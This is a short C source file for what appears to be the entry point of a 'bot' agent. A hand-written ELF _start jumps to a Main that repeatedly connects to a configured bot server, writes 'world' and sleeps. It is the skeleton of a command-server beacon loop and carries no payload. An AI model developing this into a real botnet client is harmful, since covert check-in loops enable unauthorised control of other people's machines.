


#include "agent.h"




/*
/===========================\
 *     BOT-ENTRY-POINT     *
\===========================/
*/
_GCC_ATTR(noreturn, visibility("hidden"))
VOID Main(VOID) {
    LONG sockFd;
    struct sockaddr_in sockAddr = {
        .sin_family = AF_INET,
        .sin_port   = htons(BOT_SERVER_PORT),
        .sin_addr   = BOT_SERVER_IPV4
    };

    while (TRUE) {
        if (not SYSFAIL(sockFd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP))) {

            if (not SYSFAIL(connect(sockFd, &sockAddr, sizeof(struct sockaddr_in)))) {
                write(sockFd, "world\n", 6);
            }

            close(sockFd);
        }
        sys_sleep_ms(SOCK_TIMEOUT);
    }

    _UNREACHABLE();
}


/* ELF Process Entry Point: transfer control to Main (no arguments) */
_GCC_ATTR(naked, noreturn, visibility("hidden"))
VOID _start(VOID) {
    _GCC_ASM (
        "andq $-16, %rsp\n\t" // 1. Enforce 16-byte stack alignment
        "subq $8,   %rsp\n\t" // 2. Simulate call stub: ensure rsp % 16 == 8
        "jmp Main\n\t"        // 3. Direct PC-relative jump (PIE-safe)
    );
    _UNREACHABLE();
}
